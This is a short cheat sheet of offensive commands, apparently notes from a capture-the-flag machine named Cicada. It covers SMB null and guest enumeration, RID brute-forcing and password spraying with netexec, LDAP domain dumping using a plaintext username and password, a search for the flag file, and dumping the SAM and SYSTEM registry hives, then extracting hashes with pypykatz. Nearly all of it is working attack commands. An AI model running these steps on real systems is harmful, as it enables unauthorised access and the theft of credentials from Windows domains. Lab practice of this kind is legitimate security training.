#### SMB:
  * smbclient -N -L //10.10.11.35
  * netexec smb 10.10.11.35 -u 'a' -p '' --shares
  * smbclient -U Guest //10.10.11.35/share
  * netexec smb 10.10.11.35 -u Guest -p '' --rid-brute
  * netexec smb 10.10.11.35 -u username.txt -p 'password123!'

### LDAP:
  * ldapdomaindump 10.10.11.35 -u 'domain\username' -p 'password123!'
  * ldapdomaindump 10.10.11.35 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'

#### Powershell:
  * Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue

#### System SAM Hive dump:
  * cd c:\
  * mkdir Temp
  * reg save hklm\sam c:\Temp\sam
  * reg save hklm\system c:\Temp\system
  * cd Temp
  * download sam
  * download system
  * pypykatz registry --sam sam system 
